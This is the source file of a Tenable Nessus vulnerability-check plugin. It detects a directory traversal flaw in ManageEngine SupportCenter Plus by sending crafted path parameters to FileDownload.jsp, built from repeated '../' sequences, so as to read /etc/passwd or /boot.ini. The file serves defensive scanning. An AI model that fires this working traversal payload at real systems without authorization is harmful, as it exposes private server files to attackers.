#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(55449);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_osvdb_id(73432);
  script_xref(name:"EDB-ID", value:"17442");

  script_name(english:"ManageEngine SupportCenter Plus FileDownload.jsp path Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve a local file");

  script_set_attribute(attribute:"synopsis", value:"The remote web server is prone to a directory traversal attack.");
  script_set_attribute(
    attribute:"description",
    value:
"The installed version of ManageEngine SupportCenter Plus fails to
sanitize user-supplied input to the 'path' parameter of the
'workorder/FileDownload.jsp' script of directory traversal sequences
when 'module' is set to 'Request' before using it to return the
contents of a file.

An unauthenticated, remote attacker can leverage this issue to
retrieve arbitrary files through its web server using specially
crafted requests subject to the privileges under which the web server
operates."
  );
  script_set_attribute(attribute:"see_also", value:"https://supportcenter.wiki.zoho.com/Read-Me-7803.html");
  script_set_attribute(attribute:"solution", value:"Update to version 7.8 build 7803 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/06/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/06/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/06/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:manageengine:supportcenter_plus");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencies("manageengine_supportcenter_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/manageengine_supportcenter");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");



port = get_http_port(default:8080);


install = get_install_from_kb(appname:'manageengine_supportcenter', port:port, exit_on_fail:TRUE);
dir = install['dir'];


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', "/boot.ini");

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Try to exploit the issue to retrieve a file.
foreach file (files)
{
  file_pat = file_pats[file];

  if ("boot.ini" >< file || "Windows" >< os)
  {
    exploit = mult_str(str:"..\", nb:12) + '..' + str_replace(find:"/", replace:"\", string:file);
  }
  else
  {
    exploit = urlencode(str:mult_str(str:"../", nb:12) + '..' + file);
  }
  fname = ereg_replace(pattern:".+?([^/\\]+)", replace:"\1", string:file);

  url = dir + '/workorder/FileDownload.jsp?' +
    'FILENAME=' + fname + '&' +
    'module=Request&' +
    'ID=1&' +
    'path=' + exploit + '&' +
    'delete=false';
  res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

  if (res[2] && egrep(pattern:file_pat, string:res[2]))
  {
    if (report_verbosity > 0)
    {
      line_limit = 10;

      header =
        'Nessus was able to exploit the issue to retrieve the contents of\n' +
        "'" + file + "' on the remote host using the following URL";
      trailer = '';

      if (report_verbosity > 1)
      {
        trailer =
          'Here are its contents (limited to ' + line_limit + ' lines) :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          beginning_of_response(resp:res[2], max_lines:line_limit) +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30);
      }
      report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    exit(0);
  }
}
exit(0, "The ManageEngine SupportCenter Plus install at "+build_url(port:port, qs:dir+"/")+" is not affected.");
